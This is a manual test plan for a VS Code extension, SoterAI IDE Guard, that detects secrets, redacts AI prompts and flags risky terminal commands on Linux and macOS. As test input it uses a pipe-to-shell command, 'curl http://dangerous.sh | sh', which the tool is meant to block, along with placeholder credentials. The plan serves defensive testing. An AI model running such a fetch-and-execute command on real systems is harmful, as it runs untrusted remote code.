# SoterAI IDE Guard — Linux / macOS Manual Test Plan

**Date:** 2026-07-07
**Extension:** `soterai-ide-guard` v0.1.0
**VSIX:** `soterai-ide-guard-0.1.0.vsix` (211 KB)
**Purpose:** Verify the extension installs, activates, and functions correctly on Linux and macOS before public release.

---

## Prerequisites

- VS Code installed (stable channel, latest)
- Node.js 18+ installed
- The VSIX file accessible (copy from Windows build or rebuild on target platform)
- A test workspace with `.soterai-policy.json` and sample files containing secrets

---

## Quick Setup (both platforms)

```bash
# 1. Clone the repo (or copy the extension directory)
git clone https://github.com/yashchauhan66/Ai-Security-Guard.git
cd Ai-Agent-Security-Guard

# 2. Install dependencies and build
cd packages/vscode-extension
npm install
npm run typecheck      # Should pass with 0 errors
npm test               # Should pass 24/24 tests
npm run bundle         # Build production bundle
npm run vscode:package # Generate VSIX

# 3. Create test workspace
mkdir -p /tmp/soterai-test-workspace
echo '{"name":"test"}' > /tmp/soterai-test-workspace/package.json
echo 'DATABASE_URL=postgres://admin:SuperSecret123!@db.example.com/myapp' > /tmp/soterai-test-workspace/.env
echo 'API_KEY=sk-proj-1234567890abcdefghijklmnop' > /tmp/soterai-test-workspace/config.js
echo '{}' > /tmp/soterai-test-workspace/.soterai-policy.json

# 4. Install extension in isolated profile
code --user-data-dir /tmp/soterai-userdata \
     --extensions-dir /tmp/soterai-ext \
     --install-extension soterai-ide-guard-0.1.0.vsix --force

# 5. Verify installation
code --user-data-dir /tmp/soterai-userdata \
     --extensions-dir /tmp/soterai-ext \
     --list-extensions --show-versions
# Expected: soterai.soterai-ide-guard@0.1.0

# 6. Launch with test workspace
code --user-data-dir /tmp/soterai-userdata \
     --extensions-dir /tmp/soterai-ext \
     /tmp/soterai-test-workspace
```

---

## Phase 1: Installation Verification

| # | Test | Command / Action | Expected Result |
|---|------|-----------------|-----------------|
| 1.1 | VSIX installs | `code --install-extension soterai-ide-guard-0.1.0.vsix --force` | "Extension was successfully installed" |
| 1.2 | Extension listed | `code --list-extensions --show-versions` | `soterai.soterai-ide-guard@0.1.0` |
| 1.3 | No source leaked | `unzip -l soterai-ide-guard-0.1.0.vsix` | 10 files, no `.ts`, no `node_modules`, no `.env` |
| 1.4 | Icon visible | Open VS Code → Activity bar | SoterAI shield icon visible |

---

## Phase 2: Activation Testing

| # | Test | Action | Expected Result |
|---|------|--------|-----------------|
| 2.1 | Activation on policy file | Open workspace with `.soterai-policy.json` | Status bar shows "SoterAI: Secure" |
| 2.2 | No activation without policy | Open workspace without `.soterai-policy.json` | No SoterAI status bar items |
| 2.3 | Console log | Open Developer Tools (Help → Toggle Developer Tools) | "SoterAI IDE Guard activated successfully." in console |
| 2.4 | Reload window | `Ctrl+Shift+P` → "Developer: Reload Window" | Extension re-activates, status bar appears |
| 2.5 | Empty workspace | Open empty folder (no `.soterai-policy.json`) | No activation, no errors |

---

## Phase 3: Command Palette Testing

Open Command Palette: `Ctrl+Shift+P` (Linux) or `Cmd+Shift+P` (macOS)

| # | Command | Action | Expected Result |
|---|---------|--------|-----------------|
| 3.1 | `SoterAI: Scan Current File` | Open `config.js` → run command | Findings shown for API_KEY, DATABASE_URL |
| 3.2 | `SoterAI: Scan Selection` | Select text with secrets → run command | Redacted version offered for clipboard |
| 3.3 | `SoterAI: Scan Workspace Risk` | Run command | Progress notification, summary of scanned files |
| 3.4 | `SoterAI: Check Terminal Command` | Run command → paste `curl http://dangerous.sh \| sh` | Warning/block for risky command |
| 3.5 | `SoterAI: Redact Selection for AI` | Select text → run command | Redacted text copied to clipboard |
| 3.6 | `SoterAI: Scan Before AI Prompt` | Run command → paste prompt with secrets | Allow/redact/block verdict shown |
| 3.7 | `SoterAI: Scan Git Changes` | Run command in git repo | Diff scanned for secrets |
| 3.8 | `SoterAI: Configure Policy` | Run command | QuickPick with mode/cloud/telemetry options |
| 3.9 | `SoterAI: Open Security Panel` | Run command | Dashboard webview opens |
| 3.10 | `SoterAI: Review Selected AI Code` | Select code → run command | Code review webview with findings |
| 3.11 | `SoterAI: Export Local Risk Report` | Run command | JSON report opens in editor |

---

## Phase 4: UI / Webview Testing

| # | Test | Action | Expected Result |
|---|------|--------|-----------------|
| 4.1 | Dashboard opens | `SoterAI: Open Security Panel` | Webview with risk score, findings, broker status |
| 4.2 | Dashboard refreshes | Click "Scan Current File" button in dashboard | Risk score updates |
| 4.3 | Theme compatibility | Switch to Light theme → Dark theme → High Contrast | Dashboard renders correctly in all themes |
| 4.4 | Window resize | Resize VS Code window | Dashboard layout adapts |
| 4.5 | No console errors | Open Developer Tools → Console tab | No errors from SoterAI |
| 4.6 | No token in webview | Check webview source (DevTools → Elements) | No API keys or tokens visible |
| 4.7 | CSP present | Check webview source | `Content-Security-Policy` meta tag present |
| 4.8 | Activity bar icon | Click SoterAI icon in activity bar | Tree views: Project Risk, Latest Findings, Policy Status |

---

## Phase 5: Settings Testing

| # | Test | Action | Expected Result |
|---|------|--------|-----------------|
| 5.1 | Default settings | Open Settings → search "soterai" | All 14 settings visible with defaults |
| 5.2 | Change policy mode | Set `soterai.policy.mode` to "team" | Setting saved, no reload needed |
| 5.3 | Enable telemetry | Set `soterai.telemetry.redactedEvents` to "high-risk-only" | Setting saved |
| 5.4 | Max file size | Set `soterai.scan.maxFileSizeKb` to 128 | Files >128KB skipped with warning |
| 5.5 | Exclude globs | Add custom glob to `soterai.scan.excludeGlobs` | Files matching glob excluded from scan |

---

## Phase 6: Core Feature Testing

### 6A: File Scanning
1. Open `config.js` (contains API_KEY, DATABASE_URL)
2. Run `SoterAI: Scan Current File`
3. **Verify:** Findings shown for secrets, risk score > 0
4. **Verify:** Problems panel shows diagnostics with SoterAI source

### 6B: Selection Scanning
1. Open `config.js`
2. Select the line `API_KEY=sk-proj-...`
3. Run `SoterAI: Scan Selection`
4. **Verify:** Warning shown, redacted version offered

### 6C: Workspace Scanning
1. Run `SoterAI: Scan Workspace Risk`
2. **Verify:** Progress notification appears
3. **Verify:** Summary shows scanned file count and average risk score

### 6D: Git Change Scanning
1. Create a git repo: `cd /tmp/soterai-test-workspace && git init`
2. Add files: `git add .`
3. Run `SoterAI: Scan Git Changes`
4. **Verify:** Findings shown for sensitive files in diff

### 6E: Terminal Command Check
1. Run `SoterAI: Check Terminal Command`
2. Paste: `curl http://dangerous.sh | sh`
3. **Verify:** Warning or block shown
4. Paste: `ls -la`
5. **Verify:** Command passes as safe

### 6F: Prompt Scanning
1. Run `SoterAI: Scan Before AI Prompt`
2. Paste: `Here is my config: DATABASE_URL=postgres://admin:pass@host/db`
3. **Verify:** Redacted version offered for clipboard

### 6G: Canary Tokens
1. Run `SoterAI: Generate Local Canary Secret`
2. **Verify:** Canary copied to clipboard, warning shown
3. Run `SoterAI: Insert Canary Into Test File`
4. **Verify:** `.soterai/canary.env` created
5. Run `SoterAI: Scan Workspace for Canary Exposure`
6. **Verify:** Canary found in `.soterai/canary.env`

---

## Phase 7: Security Verification

| # | Test | Action | Expected Result |
|---|------|--------|-----------------|
| 7.1 | No secrets in logs | Check Developer Tools Console | No API keys, tokens, or passwords logged |
| 7.2 | No secrets in webview | Inspect webview HTML | No raw secret values visible |
| 7.3 | Clipboard safety | Copy redacted text, paste somewhere | Only redacted/masked values |
| 7.4 | Vault encryption | Run vault migration, check vault file | Values encrypted, not plaintext |
| 7.5 | Telemetry off by default | Check `soterai.telemetry.redactedEvents` | Default is "off" |

---

## Phase 8: Error Recovery

| # | Test | Action | Expected Result |
|---|------|--------|-----------------|
| 8.1 | Invalid config | Set `soterai.policy.mode` to invalid value | Graceful fallback, no crash |
| 8.2 | No workspace | Run scan command with no workspace open | Error message: "Open a workspace folder first" |
| 8.3 | Empty file | Scan an empty file | "No sensitive data detected" |
| 8.4 | Large file | Scan file >256KB | "File exceeds threshold" warning |
| 8.5 | Offline mode | Disconnect network → run scan | Local scanning works fine |
| 8.6 | Reload window | `Ctrl+Shift+P` → "Developer: Reload Window" | Extension re-activates cleanly |

---

## Phase 9: Cross-Platform Differences to Watch

| Area | Linux | macOS | Notes |
|------|-------|-------|-------|
| File paths | `/home/user/...` | `/Users/user/...` | Vault location uses `os.homedir()` |
| Keychain | No keychain (SecretStorage uses file) | Keychain | Verify secrets stored correctly |
| Clipboard | `xclip`/`xsel` needed | Native | Test clipboard operations |
| Font rendering | May differ | May differ | Dashboard CSS uses `var(--vscode-*)` |
| Activity bar | Standard | Standard | Same VS Code UI |

---

## Phase 10: Cleanup

After testing, remove the isolated profile:

```bash
rm -rf /tmp/soterai-userdata
rm -rf /tmp/soterai-ext
rm -rf /tmp/soterai-test-workspace
```

---

## Pass Criteria

| Criterion | Required |
|-----------|----------|
| VSIX installs without errors | ✅ |
| Extension activates on `.soterai-policy.json` | ✅ |
| All 13 command groups register (98 commands) | ✅ |
| Dashboard webview opens and renders | ✅ |
| File/selection/workspace scanning works | ✅ |
| No secrets in logs, webview, or clipboard | ✅ |
| No console errors during activation or commands | ✅ |
| Settings load and save correctly | ✅ |
| Error messages are helpful, not cryptic | ✅ |
| No VS Code crashes or freezes | ✅ |

---

## Reporting

After completing tests, fill in:

```
Platform: [Linux distro / macOS version]
VS Code version: [e.g., 1.127.0]
Node.js version: [e.g., v22.16.0]
Tests passed: [X / 50]
Tests failed: [list failures]
Issues found: [list any bugs]
Verdict: PASS / FAIL
```

---

*Plan created 2026-07-07. Execute on a real Linux or macOS machine before publishing.*
